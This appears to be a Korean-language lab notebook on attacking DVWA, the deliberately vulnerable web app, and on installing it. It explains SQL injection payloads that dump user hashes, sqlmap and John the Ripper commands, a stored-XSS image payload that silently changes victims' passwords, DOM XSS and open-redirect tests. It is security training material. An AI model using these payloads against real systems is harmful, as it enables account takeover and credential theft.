## 1. 네트워크 연결 복구

```bash
sudo nmcli connection down "Wired connection 1"
sudo nmcli connection up "Wired connection 1"
```

**왜 쓰는가**
VM 환경에서 네트워크 어댑터 설정을 바꾸거나 IP 할당이 꼬였을 때, 연결을 한 번 내렸다가 다시 올려서 DHCP 임대를 새로 받기 위해 사용. 재부팅 없이 네트워크 인터페이스만 빠르게 리셋하는 방법.

| 명령어 | 의미 |
|---|---|
| `nmcli connection down "이름"` | 지정한 연결(인터페이스)을 비활성화 |
| `nmcli connection up "이름"` | 지정한 연결을 다시 활성화 (IP 재할당 포함) |

## 3. SQL Injection

### 3-1. 컬럼 개수 / 인젝션 포인트 확인

```sql
5' union select 1,2#
```

| 기호/구문 | 의미 |
|---|---|
| `'` | 원래 쿼리의 문자열 값을 강제로 종료시켜, 뒤에 오는 내용이 SQL 코드로 해석되게 만드는 트리거 |
| `union select` | 기존 쿼리 결과에 **내가 지정한 값**을 추가로 합쳐서 출력시키는 구문. 화면에 어떤 컬럼이 보이는지 역으로 추적하는 데 씀 |
| `1,2` | 컬럼 개수를 맞추기 위한 더미 값. 원래 쿼리가 2개 컬럼을 SELECT하고 있다는 걸 미리 추정해서 넣어본 것 |
| `#` | MySQL에서 한 줄 주석 시작 기호. 이 뒤에 원래 있던 쿼리 잔여 부분을 통째로 무시시키는 용도 |

**왜 쓰는가**: UNION 기반 인젝션은 내가 넣은 컬럼 개수가 원본 쿼리의 컬럼 개수와 정확히 일치해야 에러 없이 결과가 출력됨. 따라서 1개, 2개, 3개... 식으로 늘려가며 에러가 안 나는 지점을 찾아 "이 쿼리는 컬럼이 몇 개인지"를 알아내는 게 첫 단계.

### 3-2. DB 버전 확인

```sql
5' union select 1, @@version#
```

| 구문 | 의미 |
|---|---|
| `@@version` | MySQL/MariaDB가 기본으로 제공하는 시스템 변수로, 현재 DB 서버의 버전 문자열을 반환 |

**왜 쓰는가**: 버전을 알아야 이 DB에 어떤 취약점이 알려져 있는지(예: 특정 버전대의 인증 우회 버그), 어떤 함수가 지원되는지(버전별로 함수 차이 있음)를 판단할 수 있음. 실습에서 확인된 `5.1.54-log`는 MySQL 5.1.54 버전이며 로깅이 활성화된 상태를 의미하고, 이 버전대는 `CVE-2012-2122`라는 인증 우회 취약점이 보고된 적이 있는 버전이라는 배경 지식 차원의 참고 사항.

### 3-3. 메타데이터 추적 (information_schema)

```sql
5' union select table_schema, 2 from information_schema.tables#
5' union select 1, table_name from information_schema.tables where table_schema='dvwa'#
5' union select 1, column_name from information_schema.columns where table_name='users'#
5' union select user, password from dvwa.users#
```

| 단계 | 쿼리 | 알아내는 정보 |
|---|---|---|
| ① | `information_schema.tables`의 `table_schema` 조회 | 서버에 존재하는 데이터베이스(스키마) 목록 |
| ② | `table_schema='dvwa'` 조건으로 `table_name` 조회 | dvwa 데이터베이스 안의 테이블 목록 |
| ③ | `table_name='users'` 조건으로 `column_name` 조회 | users 테이블의 컬럼 이름 목록 |
| ④ | `dvwa.users`에서 `user, password` 직접 조회 | 실제 계정/해시 비밀번호 데이터 |

**왜 쓰는가**: `information_schema`는 MySQL이 모든 DB에 기본 제공하는 "메타데이터 저장소"로, 어떤 DB가 있고 어떤 테이블/컬럼이 있는지 알려주는 사전 같은 역할. 데이터를 바로 훔치기 전에 "어디에 뭐가 있는지" 지도를 먼저 그리는 단계.

> 이 취약점이 발생하는 근본 원인은, 웹 애플리케이션이 사용자 입력을 단순한 값(이름, 숫자)으로 신뢰하지 않고, 그 안에 포함된 `'`, `union`, `#` 같은 SQL 예약어를 필터링 없이 그대로 쿼리문에 이어붙였기 때문.

### 3-4. 해시 식별 및 크래킹

```bash
sudo hash-identifier <<< 해시값
sudo john --format=Raw-MD5 dvwa.txt
```

| 명령어 | 의미 |
|---|---|
| `hash-identifier` | 입력한 문자열의 패턴(길이, 형식)을 보고 어떤 해시 알고리즘(MD5, SHA1 등)으로 생성됐는지 추정해주는 도구 |
| `<<< 문자열` | 셸에서 문자열을 표준입력으로 바로 흘려넣는 리다이렉션 (파일 없이 한 줄만 넘길 때 편함) |
| `john --format=Raw-MD5 파일` | John the Ripper. 지정한 포맷(여기선 순수 MD5)으로 파일 안의 해시들을 사전/규칙 기반으로 크래킹 |

**왜 쓰는가**: DB에서 뽑아온 비밀번호는 평문이 아니라 해시 상태이므로, 먼저 어떤 알고리즘인지 식별한 뒤(`hash-identifier`) 그에 맞는 크래킹 도구 옵션(`--format`)을 지정해서 원문 비밀번호를 복원.

### 3-5. ZAP을 이용한 Medium 레벨 우회

```
1 or 1=1#
```

**진행 방식**: ZAP(OWASP ZAP, 웹 취약점 분석 프록시 도구)으로 요청을 가로채서(intercept) 멈춘 뒤, 파라미터 값을 직접 조작해서 보내고 응답을 관찰. Low 레벨에서 입력창에 바로 칠 수 있던 페이로드가, Medium 레벨에서는 입력값이 숫자로 강제 변환되는 등 필터링이 들어가서 입력창으로는 안 먹히는 경우가 있는데, 이때 프록시로 요청 자체를 가로채서 필터링이 적용되기 전 단계의 값을 직접 바꿔 보내는 방식.

### 3-6. sqlmap을 이용한 자동화

```bash
sudo sqlmap --cookie="PHPSESSION=세션값; security=medium" -u http://172.16.11.212/vulnerabilities/sqli/ --data "id=1&Submit=Submit" -p id --dbs
```

**왜 쓰는가**: 위 3-1~3-4 과정(컬럼 수 추정 → 메타데이터 추적 → 데이터 추출)을 수동으로 하나씩 친 것을, sqlmap은 자동으로 탐지하고 단계별로 진행해줌. 실무/CTF에서는 수동으로 원리를 이해한 뒤 sqlmap 같은 도구로 속도를 높이는 게 일반적인 흐름.

| 단계 | 옵션 | 의미 |
|---|---|---|
| 기본 | `-u` | 공격 대상 URL |
| 기본 | `--cookie` | 로그인 세션 쿠키 + 난이도(security) 값을 함께 전달 |
| 기본 | `--data` | GET이 아닌 POST 요청일 때 함께 보낼 파라미터 |
| 기본 | `-p` | 어떤 파라미터를 공격 지점으로 지정할지 (생략 시 자동 탐색) |
| 정보 수집 | `--dbs` | 전체 데이터베이스 목록 출력 |
| 정보 수집 | `-D <DB명>` | 특정 데이터베이스 선택 |
| 정보 수집 | `--tables` | 선택한 DB의 테이블 목록 출력 |
| 정보 수집 | `-T <테이블명>` | 특정 테이블 선택 |
| 정보 수집 | `--columns` | 선택한 테이블의 컬럼 목록 출력 |
| 추출 | `-C <컬럼명>` | 특정 컬럼만 선택 |
| 추출 | `--dump` | 선택된 DB/테이블/컬럼의 실제 데이터를 전부 출력 및 저장 |

## 4. SQL Blind Injection

```sql
1' AND substr((SELECT DISTINCT table_schema FROM information_schema.columns WHERE table_schema!='information_schema' LIMIT 0,1),1,1) = 'a'#
```

| 구문 | 의미 |
|---|---|
| `substr(문자열, 1, 1)` | 문자열의 1번째 위치부터 1글자만 잘라냄 (한 글자씩 추측하기 위한 핵심 함수) |
| `LIMIT 0,1` | 결과 중 0번째(첫 번째) 행 1개만 가져옴 |
| `= 'a'` | 잘라낸 한 글자가 'a'인지 비교 — 참/거짓 결과만 페이지 반응으로 확인 가능 |

**왜 쓰는가**: 일반 SQLi는 union select로 데이터를 화면에 직접 출력시키지만, Blind SQLi는 화면에 데이터가 출력되지 않는 상황(에러 메시지나 결과 텍스트가 안 보임)에서 사용. 대신 "조건이 참이면 페이지 반응이 다르다"는 점을 이용해서, 한 글자씩 추측 → 참/거짓 확인 → 다음 글자 추측을 반복하며 데이터를 알파벳 하나씩 복원해나가는 방식.

```bash
sudo sqlmap -u "http://172.16.11.212/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --dbs
```

**왜 쓰는가**: Blind 방식은 한 글자씩 수동으로 추측하면 시간이 매우 오래 걸리기 때문에, sqlmap이 이 참/거짓 반복 작업을 자동으로 빠르게 수행 (Boolean-based blind 기법 자동화). 옵션 구성은 위 3-6 표와 동일.

## 5. CSRF (Stored XSS 결합)

```html
<img src="x" onerror='this.src="http://192.168.100.77/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change"'>
```

| 구문 | 의미 |
|---|---|
| `src="x"` | 일부러 존재하지 않는 잘못된 이미지 경로를 넣어서 로딩 실패를 유발 |
| `onerror='...'` | 이미지 로딩이 실패했을 때 자동으로 실행되는 이벤트 핸들러. 별도의 클릭 없이도 페이지가 열리는 순간 바로 실행됨 |
| `this.src="..."` | onerror가 실행되면서 src를 비밀번호 변경 요청 URL로 다시 바꿔치기 → 브라우저가 그 주소로 GET 요청을 자동 전송 |

**왜 쓰는가**: 이 페이로드를 Stored XSS 취약점이 있는 게시판/입력창에 저장해두면, 그 페이지를 연 모든 피해자의 브라우저가 자동으로 "비밀번호를 1234로 변경"하는 요청을 본인의 로그인 세션으로 보내게 됨. 즉 Stored XSS(스크립트 삽입)와 CSRF(인증된 세션을 이용한 위조 요청)를 결합해서, 피해자가 클릭조차 하지 않아도 공격이 실행되는 구조를 만드는 실습.

## 6. DVWA 설치 (Ubuntu)

### 6-1. 패키지 설치 및 확인

```bash
sudo apt install -y apache2 mariadb-server php php-mysql php-gd libapache2-mod-php
dpkg -l | grep -E "apache2|mariadb-server|php"
```

| 패키지 | 역할 |
|---|---|
| `apache2` | 웹 서버 (HTTP 요청 처리) |
| `mariadb-server` | DVWA 데이터를 저장할 DB 서버 |
| `php` | DVWA가 PHP로 작성되어 있어 실행에 필요 |
| `php-mysql` | PHP가 MySQL/MariaDB와 통신하기 위한 연동 모듈 |
| `php-gd` | DVWA의 캡차/이미지 처리 기능에 필요한 그래픽 라이브러리 |
| `libapache2-mod-php` | Apache가 PHP 코드를 직접 처리할 수 있게 해주는 연결 모듈 |

`dpkg -l | grep ...`로 이미 설치돼 있는지 먼저 확인 → 중복 설치 시간을 줄임.

### 6-2. 데이터베이스 / 계정 생성

```sql
create database dvwa;
create user 'dvwa'@'localhost' identified by 'dvwa123';
grant all privileges on dvwa.* to 'dvwa'@'localhost';
flush privileges;
```

| 명령어 | 의미 |
|---|---|
| `create database dvwa` | DVWA 전용 데이터베이스 생성 |
| `create user 'dvwa'@'localhost' identified by '...'` | root 계정을 직접 쓰지 않고, DVWA 전용 계정을 별도로 생성 (권한 분리) |
| `grant all privileges on dvwa.* to ...` | 방금 만든 계정에게 dvwa 데이터베이스 안의 모든 테이블에 대한 권한 부여 (다른 DB는 접근 불가) |
| `flush privileges` | 권한 변경 사항을 즉시 메모리에 반영 (재시작 없이 적용) |

### 6-3. 소스 다운로드 및 설정

```bash
cd /var/www/html
sudo rm -rf DVWA
sudo git clone https://github.com/digininja/DVWA.git
sudo cp config.inc.php.dist config.inc.php
vi config.inc.php
```

| 명령어 | 의미 |
|---|---|
| `rm -rf DVWA` | 이전에 실패했던 설치 폴더를 깨끗하게 제거하고 새로 시작 |
| `git clone` | DVWA 공식 GitHub 저장소에서 소스 전체를 받아옴 |
| `cp config.inc.php.dist config.inc.php` | 설정 템플릿 파일을 실제 설정 파일로 복사 (`.dist`는 "예시/기본값" 파일이라는 뜻) |
| `vi config.inc.php` | 복사한 설정 파일을 열어 DB 호스트/계정/비밀번호 등 실제 값으로 수정 |

setup.php 접속 시 입력한 값은 위 6-2에서 만든 계정 정보와 정확히 일치해야 함 (Database Host: `127.0.0.1`, User: `dvwa`, Password: `dvwa123`, Name: `dvwa`).

### 6-4. 권한 설정 및 PHP 설정

```bash
sudo chown -R www-data:www-data /var/www/html/DVWA
sudo chmod -R 755 /var/www/html/DVWA
sudo vi /etc/php/8.3/apache2/php.ini
sudo systemctl restart mysql
```

| 명령어 | 의미 |
|---|---|
| `chown -R www-data:www-data` | 폴더 소유자를 Apache가 실제로 구동되는 계정(`www-data`)으로 바꿔서, 웹서버가 파일을 읽고 쓸 수 있게 함 |
| `chmod -R 755` | 소유자는 읽기/쓰기/실행, 그 외에는 읽기/실행만 가능하도록 권한 표준화 |
| `php.ini` 수정 | DVWA 실행에 필요한 PHP 옵션(파일 업로드, 외부 URL 포함 허용 등)을 활성화 |
| `systemctl restart mysql` | 설정/계정 변경 사항을 반영하기 위해 DB 서비스 재시작 |

설치 완료 후 `http://서버주소/DVWA/`에서 기본 계정 `admin / password`로 로그인. 난이도(Security Level)를 Low → Medium으로 올리면 세션/토큰 관련 검증 방식이 더 까다롭게 바뀌는 것을 확인.

## 7. XSS (DOM)

```html
default=<script>alert("hack")</script>
```

**왜 동작하는가**: DOM 기반 XSS는 서버를 거치지 않고, 브라우저가 URL 파라미터 값을 그대로 페이지의 HTML/DOM에 끼워 넣을 때 발생. 서버 응답 자체에는 악성 스크립트가 없지만, 클라이언트 측 JavaScript가 검증 없이 파라미터 값을 화면에 그대로 출력하면서 스크립트가 실행됨. Stored/Reflected XSS와 달리 "서버 로그에는 흔적이 잘 안 남는다"는 특징이 있음.

## 9. JS Attacks

**진행 방식**: 브라우저 개발자 도구(F12) → Network 탭에서 요청에 함께 전송되는 토큰 값(CSRF 토큰 등)을 직접 확인.

**왜 하는가**: 클라이언트 측 JavaScript가 보안 토큰을 어떻게 생성하고, 서버로 어떻게 전달하는지 파악하기 위함. 토큰이 매 요청마다 바뀌는지, 예측 가능한 패턴인지를 확인하는 게 이후 우회 가능성을 판단하는 기초 작업.

## 10. Authorisation Bypass

**진행 방식**: 일반 계정으로 정상 로그인한 뒤, URL 경로를 직접 `authbypass/` 하위 경로로 바꿔서 접근.

**왜 하는가**: 이건 "Forced Browsing"이라고도 부르는 기법으로, 메뉴/링크로는 노출되지 않는 페이지라도 URL을 직접 입력해서 접근했을 때 서버가 권한을 제대로 재검증하는지 테스트하는 것. 로그인은 했지만 원래 권한 밖의 기능에 접근되면, 서버가 "로그인 여부"만 보고 "그 사용자가 이 기능에 접근 가능한 권한이 있는지"는 검증하지 않는다는 뜻.

## 11. Open HTTP Redirect

```
open_redirect/?redirect=http://google.com
```

**왜 하는가**: `redirect` 파라미터에 외부 임의 URL을 넣었을 때, 서버가 이 값이 신뢰할 수 있는 내부 주소인지 검증하지 않고 그대로 리다이렉트시키는지 테스트. 실제 공격에서는 피싱 링크를 신뢰할 수 있는 도메인 뒤에 숨기는 용도로 악용됨.

> 진행 메모: 파이썬으로 로컬 서버를 띄워 리다이렉트 대상으로 시도했으나 실패. Kali 자체 주소로 시도해도 안 됨 → 추가 디버깅 필요 항목으로 남김.

## 12. Cryptography Problems

```bash
sudo hash-identifier <<< 암호
```

**왜 하는가**: 주어진 암호(해시)가 어떤 알고리즘으로 만들어졌는지 먼저 식별해야, 이후 어떤 크래킹 도구/방식을 쓸지 결정할 수 있음 (3-4 항목과 동일한 도구, 이번엔 Cryptography 챌린지에 적용).
